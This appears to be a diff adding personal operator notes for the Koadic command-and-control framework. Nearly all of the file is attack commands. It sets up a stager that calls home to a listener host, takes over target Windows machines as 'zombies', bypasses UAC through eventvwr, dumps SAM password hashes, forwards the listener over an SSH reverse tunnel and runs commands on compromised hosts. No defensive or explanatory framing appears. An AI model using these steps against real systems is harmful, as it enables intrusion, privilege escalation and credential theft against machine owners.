@@ -1,0 +1,56 @@
+apt install mitmproxy
+
+apt install koadic
+
+####Usage
+
+sudo koadic 
+
+set SRVHOST 192.168.3.100
+set SRVPORT ####
+set ENDPOINT this
+
+#launch a stager (edit config if need to)
+run
+
+#execute the command on target Windows machines
+
+#session should be established
+
+#check
+zombies
+
+#elevate priv
+use
+use implant/elevate/bypassuac_eventvwr
+#in the payload
+info
+set PAYLOAD 0
+run
+
+#check for a new zombie
+zombies
+
+#hashdump as admin
+use implant/gather/hashdump_sam
+set ZOMBIE 1
+run
+
+SRVHOST    <internal LP IP>      yes     Where the stager should call home
+SRVPORT    <given RHP>                yes     The port to listen for stagers on
+ENDPOINT   <this, is, not, hard>              yes     URL path for callhome operations
+
+
+ssh -S /tmp/bad -O forward -R 46626:192.168.3.2:46626
+
+zombies 1
+use implant/manage/exec_cmd
+set CMD netstat
+
+
+cmdshell 0
+
+exit (kill zombies)
+zombies -k 0
+listeners -k 0
+run
